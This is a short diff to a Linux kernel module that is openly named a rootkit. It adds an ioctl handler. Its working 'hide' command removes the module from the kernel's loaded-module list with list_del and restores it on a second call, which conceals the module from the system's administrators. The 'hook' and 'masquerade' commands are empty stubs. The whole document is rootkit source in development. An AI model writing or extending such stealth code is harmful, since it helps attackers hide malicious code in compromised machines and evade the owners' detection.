@@ -21,6 +21,7 @@ MODULE_VERSION("0.1");
 
 static int major;
 struct cdev *kernel_cdev;
+struct list_head *module_list;
 
 static int rootkit_open(struct inode *inode, struct file *filp)
 {
@@ -37,8 +38,30 @@ static int rootkit_release(struct inode *inode, struct file *filp) {
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 		unsigned long arg)
 {
+    long ret = 0;
+    switch(ioctl) {
+        case IOCTL_MOD_HOOK:
+            //do something
+            break;
+        case IOCTL_MOD_HIDE:
+            if (module_list == NULL) {
+                // TODO SHOULD GO TO HEAD?
+                module_list = THIS_MODULE->list.prev;
+                list_del(&(THIS_MODULE->list));
+            }
+            else {
+                list_add(&(THIS_MODULE->list), module_list);
+                module_list = NULL;
+            }
+            break;
+        case IOCTL_MOD_MASQ:
+            //do something
+            break;
+        default:
+            ret = -EINVAL;
+    }
 	printk (KERN_INFO "%s\n", __func__);
-	return 0;
+	return ret;
 }
 
 struct file_operations fops = {
